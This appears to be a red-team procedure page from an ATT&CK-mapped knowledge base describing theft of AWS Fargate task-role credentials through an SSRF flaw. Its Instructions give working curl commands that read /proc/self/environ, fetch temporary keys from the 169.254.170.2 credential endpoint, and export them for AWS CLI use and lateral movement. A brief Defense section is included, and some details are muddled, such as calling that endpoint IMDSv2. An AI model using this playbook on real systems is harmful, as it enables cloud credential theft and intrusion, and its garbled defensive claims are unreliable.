---
id: 0d0d8328-0c05-4857-9e0e-1d1decedd1b4
name: AWS-Fargate-Container-Credentials-Theft
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:09.293993+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Collection|TA0009 - Collection]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - >-
    [[techniques/Data from Information Repositories|T1213 - Data from
    Information Repositories]]
  - >-
    [[techniques/Exploitation of Remote Services|T1210 - Exploitation of Remote
    Services]]
sub_techniques: []
tags:
  - '[[tags/AWS - Metadata SSRF]]'
  - '[[tags/Cloud - AWS]]'
  - '[[tags/Method for Container Service (Fargate)]]'
  - ssrf
  - credentials-theft
  - metadata
commands:
  - '[[commands/curl-ssrf-read-environ]]'
  - '[[commands/curl-ssrf-fetch-credentials]]'
platforms:
  - AWS
  - Linux
  - Cloud
tools: []
validated: true
---

# AWS-Fargate-Container-Credentials-Theft

## Summary

This procedure exploits a Server-Side Request Forgery (SSRF) vulnerability in an AWS Fargate containerized application to access the Instance Metadata Service (IMDS) and steal temporary IAM credentials associated with the container's task role. By tricking the application into making internal requests, an attacker can extract environment variables and credential tokens, enabling access to other AWS resources the role permits, such as S3 buckets or EC2 instances.

## Description

AWS Fargate runs containerized tasks without managing the underlying EC2 instances, but containers can still access the IMDS endpoint at 169.254.169.254 (or v2 at 169.254.170.2) if not properly restricted. This procedure leverages SSRF to read sensitive files like /proc/self/environ from the container process, revealing the AWS_CONTAINER_CREDENTIALS_RELATIVE_URI environment variable. This URI points to a token endpoint for fetching temporary credentials (AccessKeyId, SecretAccessKey, Token). These credentials are short-lived but can be used immediately for lateral movement or data exfiltration within the AWS environment. The attack assumes the target application has an SSRF-vulnerable endpoint that allows arbitrary URL or file path requests, common in file download or image processing features. It requires no prior authentication if the endpoint is public-facing but works best with authenticated access to the container's context.

## Requirements

1. A public-facing or accessible SSRF-vulnerable endpoint in the Fargate-hosted application (e.g., a download or proxy feature).
2. Knowledge of the application's base URL (e.g., https://awesomeapp.com).
3. Network access to send HTTP requests to the target (e.g., via curl or a browser).
4. Basic understanding of AWS IAM roles and IMDSv2.
5. Optional: Tools like Burp Suite for intercepting and modifying requests if the SSRF requires specific headers or payloads.

## Defense

- Disable or restrict IMDS access in Fargate task definitions using taskRoleArn with least-privilege policies and enable IMDSv2 with required hop limit (e.g., via ECS agent configuration).
- Implement SSRF protections: Validate and whitelist allowed URLs/hosts in application code, use network ACLs to block outbound to 169.254.169.254/32, and employ WAF rules to block internal IP requests.
- Monitor CloudTrail for unusual IAM credential usage, GuardDuty for SSRF patterns, and container logs for anomalous internal requests.
- Use VPC endpoints and security groups to segment metadata access, and enable AWS IAM Access Analyzer to detect overly permissive roles.

## Objectives

1. Extract the AWS_CONTAINER_CREDENTIALS_RELATIVE_URI from the container's environment via SSRF.
2. Retrieve temporary IAM credentials (AccessKeyId, SecretAccessKey, SessionToken) using the relative URI.
3. Use the stolen credentials to access authorized AWS resources for escalation or exfiltration.

## Instructions

### Step 1: Extract Environment Variables via SSRF

**Context**: Use SSRF to read the /proc/self/environ file from the container process, which contains environment variables including AWS_CONTAINER_CREDENTIALS_RELATIVE_URI. This URI is set by the ECS agent for Fargate tasks and points to the credential endpoint.

**Command** ([[commands/curl-ssrf-read-environ]]):
```bash
curl "https://awesomeapp.com/download?file=/proc/self/environ" -o environ.txt
```

> This command sends a request to the vulnerable download endpoint, forcing the application to read and return the local /proc/self/environ file. Inspect the output file for the AWS_CONTAINER_CREDENTIALS_RELATIVE_URI line, which will look like "/v2/credentials/<unique-id>". If the endpoint requires authentication, add headers like -H "Authorization: Bearer $_TOKEN". Expected output is a null-separated string of environment variables; grep for the URI: grep -a -z 'AWS_CONTAINER_CREDENTIALS_RELATIVE_URI' environ.txt.

### Step 2: Fetch Credentials Using the Relative URI

**Context**: Construct an internal URL using the extracted relative URI and use SSRF to request temporary credentials from the IMDSv2 endpoint. This returns a JSON with the IAM role's temporary keys, valid for up to 6 hours.

**Command** ([[commands/curl-ssrf-fetch-credentials]]):
```bash
curl "https://awesomeapp.com/download?file=http://169.254.170.2$_RELATIVE_URI" -o credentials.json
```

> Replace $_RELATIVE_URI with the value from Step 1 (e.g., /v2/credentials/d22070e0-5f22-4987-ae90-1cd9bec3f447). The command tricks the application into requesting the metadata endpoint. Parse the JSON output for AccessKeyId, SecretAccessKey, and Token. Example output:
```
{"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"...","Expiration":"2023-..."}
```
Test the credentials with aws sts get-caller-identity --access-key-id $_ACCESS_KEY --secret-access-key $_SECRET_KEY --token $_TOKEN to verify.

### Step 3: Validate and Use Credentials

**Context**: Confirm the credentials work and use them for further actions, such as listing S3 buckets or assuming other roles.

**Instructions**: Export the credentials as environment variables:
```bash
export AWS_ACCESS_KEY_ID=$_ACCESS_KEY
export AWS_SECRET_ACCESS_KEY=$_SECRET_KEY
export AWS_SESSION_TOKEN=$_TOKEN
```
Then run an AWS CLI command to test, e.g., aws s3 ls. If successful, proceed to lateral movement like accessing other services the role permits.

> Success is indicated by valid AWS API responses without AccessDenied errors. Rotate the task role credentials immediately upon detection.
